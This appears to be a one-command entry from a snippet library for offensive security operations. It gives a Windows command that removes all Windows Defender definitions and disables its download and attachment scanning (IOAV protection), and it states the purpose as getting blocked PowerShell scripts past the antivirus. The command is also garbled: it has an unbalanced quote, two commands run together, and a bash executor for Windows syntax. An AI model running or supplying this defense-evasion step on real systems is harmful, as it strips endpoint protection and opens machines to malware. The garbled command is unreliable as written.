---
id: 7c3014e4-49eb-41f5-838a-a3a747764401
name: Remove definitions and disable AV protection (Useful when Powershell scripts
  are being blocked by Defender)
type: command
executor: bash
data: 'c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference
  -DisableIOAVProtection $true

  '
output: null
created_at: '2020-07-14T18:21:25.398243+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)

```bash
c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true

```


